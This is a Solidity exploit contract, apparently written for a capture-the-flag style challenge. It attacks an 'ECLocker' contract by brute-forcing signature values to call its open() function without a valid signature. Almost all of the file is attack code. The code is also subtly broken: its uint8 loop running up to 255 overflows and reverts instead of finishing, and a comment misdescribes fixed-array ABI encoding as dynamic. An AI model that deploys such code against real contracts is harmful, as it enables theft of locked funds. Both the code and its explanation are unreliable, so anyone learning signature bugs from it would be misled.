// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IECLocker {
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
    function open(uint8 v, bytes32 r, bytes32 s) external;
}

contract SystematicExploit {
    event Success(uint8 v, bytes32 r, bytes32 s);
    
    function exploit(address locker) external {
        IECLocker lock = IECLocker(locker);
        
        // The bug: signature hash is computed as keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]))
        // This creates a dynamic array encoding
        
        // Let's systematically try different combinations
        // Starting with edge cases that might bypass validation
        
        // Try v values outside normal range (27, 28)
        for (uint8 v = 0; v <= 255; v++) {
            // Skip normal values initially
            if (v == 27 || v == 28) continue;
            
            // Try with simple r, s values
            if (tryOpen(lock, v, bytes32(uint256(1)), bytes32(uint256(1)))) {
                emit Success(v, bytes32(uint256(1)), bytes32(uint256(1)));
                return;
            }
            
            // Try with zero values
            if (tryOpen(lock, v, bytes32(0), bytes32(0))) {
                emit Success(v, bytes32(0), bytes32(0));
                return;
            }
        }
        
        // Now try normal v values with edge case r,s
        uint8[2] memory normalV = [uint8(27), uint8(28)];
        for (uint i = 0; i < 2; i++) {
            uint8 v = normalV[i];
            
            // Try various r,s combinations
            for (uint256 j = 0; j < 256; j++) {
                if (tryOpen(lock, v, bytes32(j), bytes32(j))) {
                    emit Success(v, bytes32(j), bytes32(j));
                    return;
                }
            }
        }
    }
    
    function tryOpen(IECLocker lock, uint8 v, bytes32 r, bytes32 s) internal returns (bool) {
        try lock.open(v, r, s) {
            return true;
        } catch {
            return false;
        }
    }
    
    // Helper to understand the signature hash
    function debugSignatureHash(uint256 r, uint256 s, uint256 v) external pure returns (bytes32, bytes memory) {
        bytes memory encoded = abi.encode([r, s, v]);
        bytes32 hash = keccak256(encoded);
        return (hash, encoded);
    }
}